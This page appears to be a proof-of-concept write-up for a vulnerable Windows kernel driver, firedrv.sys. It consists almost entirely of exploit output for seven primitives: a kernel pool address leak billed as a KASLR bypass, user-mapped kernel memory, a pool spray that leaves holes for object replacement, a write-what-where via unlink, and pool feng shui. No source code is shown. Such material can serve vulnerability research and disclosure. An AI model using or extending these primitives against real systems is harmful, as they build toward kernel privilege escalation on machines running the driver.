# firedrv.sys PoC

```text
firedrv.sys PoC
Opening \\.\IntekNodeManager...
Device opened successfully
```

## PRIM 1: Kernel Pool Address Leak

```text
Buffer object kernel address: 0xffffae092e013b50
User mapping:                 0x000001fda5ca0000
KASLR bypass: pool base ~ 0xffffae092e000000
Freed
```

## PRIM 2: Shared Kernel/User Memory

```text
Kernel address:  0xffffae092e013610
User mapping:    0x000001fda5ca0000
Wrote markers through user mapping:
    [0] = 0xDEADBEEF  [1] = 0xCAFEBABE
    [2] = 0x41414141  [3] = 0x42424242
LOOK! these are visible at kernel VA 0xffffae092e013610
[Freed
```

## PRIM 3: User Page Lock + Dual Map

```text
User buffer: 0x000001FDA5CA0000
Buffer object:   0xffffae092e013920
User VA locked:  0x000001fda5ca0000
Wrote 0x12345678 through user VA (hopium man)
[Freed and unlocked
```

## PRIM 4: NonPagedPool Spray

```text
Spraying 64 x 0x60-byte allocations (tag FDRV)...
Allocated 64/64 buffers
Pool range: 0xffffae092e013060 - 0xffffae092e014f40
Span: 0x1ee0 bytes

Kernel addresses (buffer objects):
    [00] 0xffffae092e0135a0
    [01] 0xffffae092e0134c0
    [02] 0xffffae092e013ed0
    [03] 0xffffae092e013290
    [04] 0xffffae092e013f40
    [05] 0xffffae092e013140
    [06] 0xffffae092e013300
    [07] 0xffffae092e0131b0
    [08] 0xffffae092e013060
    [09] 0xffffae092e013e60
    [10] 0xffffae092e013370
    [11] 0xffffae092e013760
    [12] 0xffffae092e013a00
    [13] 0xffffae092e013bc0
    [14] 0xffffae092e013ca0
    [15] 0xffffae092e0136f0
    [16] 0xffffae092e013df0
    [17] 0xffffae092e013220
    [18] 0xffffae092e013990
    [19] 0xffffae092e013a70
    [20] 0xffffae092e0138b0
    [21] 0xffffae092e0137d0
    [22] 0xffffae092e013450
    [23] 0xffffae092e013680
    [24] 0xffffae092e0133e0
    [25] 0xffffae092e013d10
    [26] 0xffffae092e013840
    [27] 0xffffae092e013c30
    [28] 0xffffae092e0130d0
    [29] 0xffffae092e013530
    [30] 0xffffae092e013d80
    [31] 0xffffae092e013ae0
    [32] 0xffffae092e013b50
    [33] 0xffffae092e013920
    [34] 0xffffae092e013610
    [35] 0xffffae092e014e60
    [36] 0xffffae092e0140d0
    [37] 0xffffae092e0144c0
    [38] 0xffffae092e014ae0
    [39] 0xffffae092e014ca0
    [40] 0xffffae092e014ed0
    [41] 0xffffae092e0145a0
    [42] 0xffffae092e014220
    [43] 0xffffae092e014990
    [44] 0xffffae092e014530
    [45] 0xffffae092e014300
    [46] 0xffffae092e014840
    [47] 0xffffae092e014f40
    [48] 0xffffae092e014680
    [49] 0xffffae092e014760
    [50] 0xffffae092e014a70
    [51] 0xffffae092e014370
    [52] 0xffffae092e014b50
    [53] 0xffffae092e0141b0
    [54] 0xffffae092e014a00
    [55] 0xffffae092e014450
    [56] 0xffffae092e014920
    [57] 0xffffae092e014d80
    [58] 0xffffae092e014df0
    [59] 0xffffae092e0143e0
    [60] 0xffffae092e014d10
    [61] 0xffffae092e014bc0
    [62] 0xffffae092e0148b0
    [63] 0xffffae092e014140

Freeing even-indexed allocations (creating 0x60-byte holes)...
Freed 32 allocations - holes ready for target object replacement
Freeing remaining...
Pool spray complete
```

## PRIM 5: Write-What-Where via Unlink

```text
Allocating 3 adjacent buffers...
Buffer A: kobj=0xffffae092e014060  umap=0x000001fda5ca0000
Buffer B: kobj=0xffffae092e0147d0  umap=0x000001fda5cb0000
Buffer C: kobj=0xffffae092e014290  umap=0x000001fda5cc0000

Pool layout:
    A->B delta: +1904 (0x770)
    B->C delta: -1344 (0x540)

Normal free (no corruption - safe unlink):
Buffer B freed - list unlink completed normally
Cleaned up A and C
```

## Device Scan Prim 6

```text
Scanning for FireCard devices...
No FireCard devices found (need hw or emu)
```

## PRIMITIVE 7: Pool Feng Shui

```text
Phase 1: Fill pool page with 0x60-byte objects...
Phase 2: Free slots 8-15 to create contiguous hole...
Phase 3: Re-allocate into freed holes...
Groom results:
    [0] 0xffffae092e014920
    [1] 0xffffae092e014760
    [2] 0xffffae092e0143e0
    [3] 0xffffae092e0140d0
    [4] 0xffffae092e014d10
    [5] 0xffffae092e014530
    [6] 0xffffae092e014ca0
    [7] 0xffffae092e014450
Cleaning up...
Feng shui complete
```

```text
=== Done ===
```
